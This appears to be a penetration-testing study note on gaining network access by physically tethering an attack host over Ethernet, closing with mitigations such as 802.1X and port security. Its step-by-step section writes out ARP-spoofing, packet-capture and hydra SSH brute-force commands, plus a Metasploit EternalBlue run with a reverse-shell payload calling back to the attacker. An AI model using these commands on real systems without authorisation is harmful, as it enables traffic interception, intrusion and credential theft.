# Index
- [[Physical Access Attacks]]

Physically tethering a device via Ethernet to a target host refers to directly connecting your attack host to the target machine using a wired Ethernet cable. This method establishes a local, direct connection, bypassing potential wireless or segmented network defenses. When an attack host is physically tethered to a target, it opens the door for a variety of attack vectors that exploit the direct nature of the connection. Below, I'll break down how this approach works, how to perform the tethering, and what attacks can be performed.

# Ethernet tethering Process
Tethering via Ethernet involves the following steps:
- Physical Access: The attacker must gain physical access to the target host or a network switch where the target host is connected.
- Ethernet Cable: The attacker connects an Ethernet cable between the target host (or a network device) and the attack host.
- Network Interface Configuration: Once connected, the attacker configures their network interface to communicate with the target host. This could involve setting static IP addresses, spoofing MAC addresses, or configuring DHCP to request an IP address.

# Why This Attack Vector is Effective
- Bypass Network Segmentation: If the target host is located on a segmented network (separate from the attacker's wireless or remote networks), physically tethering allows the attacker to bypass segmentation, gaining direct access.
- Traffic Interception and Man-in-the-Middle (MITM) Attacks: A direct Ethernet connection enables the attacker to intercept, inspect, and manipulate network traffic in real-time. This is especially useful for Man-in-the-Middle attacks.
- Unmonitored Physical Connections: Many organizations may not monitor physical Ethernet ports on user workstations, making it easier for attackers to operate without detection.
- Access to Critical Systems: Many sensitive systems, such as industrial control systems (ICS) or operational technology (OT), may only be accessible via local connections, making tethering essential.

# Steps to Perform Ethernet tethering

#### Step 1: Physical Connection to the Target
The attacker connects an Ethernet cable between the attack host and the target host. This could be directly to the target's network interface or via a network switch that the target is connected to.

Example:  
```bash
# Attack Host Interface
ifconfig eth0 up  # Ensure the Ethernet interface is up
```

#### Step 2: IP Address Configuration
Once physically connected, the attack host must configure its network interface to communicate with the target host. This may involve DHCP or setting a static IP.

Static IP Assignment Example:
```bash
# Assign a static IP to the attack host interface
ifconfig eth0 <attack_ip> netmask 255.255.255.0 up
# Set the default gateway to the target's network gateway
route add default gw <gateway_ip>
```

Alternatively, the attacker may request an IP via DHCP:
```bash
# Request an IP from the network's DHCP server
dhclient eth0
```

#### Step 3: Network Scanning
With the physical connection established, the attacker can perform network discovery and scanning to identify reachable hosts, open ports, and network services.

Example with nmap:
```bash
nmap -sP <target_ip>/24  # Discover all live hosts on the network
nmap -p- <target_ip>     # Scan all ports on the target host
```

#### Step 4: Launch Attack Vectors

##### A. Man-in-the-Middle (MITM) Attack (ARP Spoofing)
With the attack host connected to the same physical network, ARP spoofing can be used to perform a Man-in-the-Middle attack.

Example using `arpspoof`:
```bash
# Poison the ARP cache of the target and the gateway
arpspoof -i eth0 -t <target_ip> <gateway_ip>
arpspoof -i eth0 -t <gateway_ip> <target_ip>
```

Once ARP poisoning is in place, the attacker can intercept traffic between the target host and the gateway.

##### B. Traffic Capture (Packet Sniffing)
Once tethered, the attacker can monitor network traffic using tools like `tcpdump` or `Wireshark`.

Example using `tcpdump`:
```bash
tcpdump -i eth0 -w capture.pcap
```

##### C. Lateral Movement
With direct access to the target host’s network, the attacker can attempt to exploit vulnerable services or credentials to pivot to other systems on the network.

Example using `msfconsole` for an SMB exploit:
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attack_ip>
set LPORT <attack_port>
exploit
```

##### D. Direct Remote Code Execution
If the target host is running a vulnerable service, the attacker can attempt to exploit it directly, given the physical proximity and unfiltered access.

Example:
```bash
# Exploit SSH vulnerability if weak credentials are used
hydra -l root -P /path/to/passwords.txt ssh://<target_ip>
```

# Ethernet tethering: Risks and Mitigations

Risks:
- Physical Security: If physical access to devices is not tightly controlled, an attacker can leverage this to bypass network defenses entirely.
- Network Segmentation Bypass: Ethernet tethering allows attackers to bypass firewalls, VLANs, and segmentation controls designed to isolate sensitive systems.
- Increased Attack Surface: Attackers can introduce rogue devices or malicious traffic onto a network, potentially compromising sensitive systems.

Mitigations:
- Physical Security Controls: Ensure that all critical systems are housed in secure locations with restricted access.
- Port Security: Enable MAC address filtering and 802.1X port-based authentication on all Ethernet ports to prevent unauthorized devices from connecting.
- Network Monitoring: Implement logging and monitoring for all physical connections to detect unauthorized access attempts.
- Segmentation Enforcement: Enforce network segmentation with firewalls and restrict access based on strict rules, even within local subnets.